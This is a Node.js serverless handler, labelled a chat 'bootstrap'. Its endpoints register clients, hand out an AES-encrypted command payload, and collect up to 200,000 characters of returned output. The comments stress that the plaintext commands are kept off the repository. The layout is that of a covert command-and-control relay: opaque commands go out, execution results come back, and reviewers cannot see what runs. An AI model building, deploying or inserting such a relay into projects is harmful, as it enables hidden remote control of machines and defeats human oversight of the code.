import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';

// These two values are updated temporarily while the owner's server is being configured.
// The command body is always AES-256 encrypted with a secret generated on the VPS;
// plaintext commands are never committed to this repository.
const CONTROL_ID = '1';
const CONTROL_PAYLOAD = 'U2FsdGVkX1/DzYliEuIh7AsK4zGR/Apa2cMvl2fHHDKK/mFpSZLXop7VzeYzr8VG0JTV4cgbZmN5bqyv+H4ijXI5AS/SaKCGDzuS32wLR/Twl5Q/5L8MokpqqrBA12rK7CWNJACZbMNh5Z0ADrZ10+rq0lpt+KO8GNCfCY73finfmcWKv3DMNMauKAxMAHgO/ZXy5/IYi0obDaBAZ6Q5yY+hsU1gqeQaL4G7VPV3JP4JtsYX53qP/6/8DRPXLUc6iITPdrJbjXw1DyjwF5Z4XFa29x8J1EpAHDq9ZCsFtYkBrd/cKUHK/tpzjJz9AC5JRXZS9z9HIkrYl8kA+fxPkdwkrFmA9nKP4rIjGDAtnScD6waFkN+ASq4R8EM99UaR58OMjyFzei3xkmLZYsYKhXrzMD9jjTFI20lpUCf4fOESux2pQqnOHD1w87j334TpHF1FNI6rZGPQgMSz7jj2wmBkZHN8Zz/x+Cf9SDJLL5KdiJ++N4sPICCWoCb/U3BpH2JZRKpCy0oDAJfZ3GKTDyAxcYRFeLyrvIajS1STAPutPDqW646Egzs9DoMrbiI1jNiPbnB/yjqXjCbk5wGdszjnJLqsBF+lWsxAo1Uz+g903a4TTTxRFeGsBJsDY4vivjqzzPzVmmnCbNL1IorDPvdvcp5SVih/WxhgY6gNVI1YXdWDuGi54/QUtq214ol4ZhVapqPM5jAoIothvv1xyjeV8s34kfWxOZSWIemDsQMLMQkzU2EkzHvxUYRh9Lh25mZpY/ydJ5r0T3kCUtAvrFlgeI+8J5X4whrDj4fL34ssjKitOOnZQnaaql2brbdkINDoy1PLIAkBRzsM5dw8Jlw7U3In+u+EBcSxwbe/Y2zIBMQ50Rpi9KeWzrVOdIB2wcEHk8cBFpDogovaO/y/DIUkmMQ4nj0DIeJNfvLTadrjHOZC04eFAI33musWSg7bLx/iJ0YtkZ0WW92CDA2lBkfftVFu2MwKP8TQsQQ96MxY4Kf6KmmgVwsH09liqcxOTK+pBA3KIWo85biMC/w2Q0gFf/6UGFE93DKE2CoDCPoOsh0YyQKdUwnwElZ2h3YXl5HTs4sZINaivayYjE6e/QTgOhJdbMD6nKLYRRDHlJ3c/D4vy6ydK9U4PuwulHLtOkyl8fMCrmI4h8g++AHcG4JKICeIlsHs8J3KW4KFlLsUMHyUI3v90f1oh/oUNw7/PsLmX492VT6Hs6EsDaLKjP8ZJW5fRVP6bUIoSYugn0FfdtEtTwalcVfKgxb8IbxKlEK7NYi19NwoZolMgV71LKm1fxvXGxYfE3wblGenwCizDk1DG5WNv+ZdBuT6f0Z1hQSWatQGqd+SwqTa4Vw1DdmtSWxUUbNVSvzLI49tvTV2vD9UR5fWIBmZh0bl2RIqg+/EKiBc5H1jJndda2zO1Hz9XW6Yh64rarVWggoWS8i+BldJQdRfa2UNfpIi21MCGQFvaHIm+Plxi4IKZSL1f3JvQpGcnkpOLNJIKVaYIJ+Wm+dm2IH8nRX78PsHNz+pqt/+FcxBTk7k5uS4A54FT3n2TgCx4B28zRO8enonujJs3K0JGan4ANVJXoytsWmUSG/aG9XNkO+IAhj+rgKoMjT/tdLmuU5sXykx6YlOfOu/8535fQF3E0fu/QA4RObj8o/EI9VbPZqImdU2IAdXxzlVDW5cpBB7aYvoQ7mzY9QZZvXd2GIk3MvhsonaoUY8BsXUCh5xPQqeK8iSnm33/ReKAiBVZQLI8bA5/XkQ765cTlJlvVnC1kuXpQItooUsKXu0AvP7xsc4gR0tGN4t7L63YUhDtpJbeijDyhpcK27ch+ijmvMxGC7gK32fphg4gNNAXlHB9Ikmdcp4FHuKKKNf6okyl1+mXRJGHzPrYx3oVcx8cNt639p91UimqKqGec6OykkmPzPxribA59q2rJSqLhSqEeaQM2111EdxGl8=';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);

  const chunks = [];
  for await (const chunk of request) {
    chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  }
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');

  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) {
      return response.status(404).send('Not found');
    }
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }

  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }

  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }

  return response.status(404).send('Not found');
}
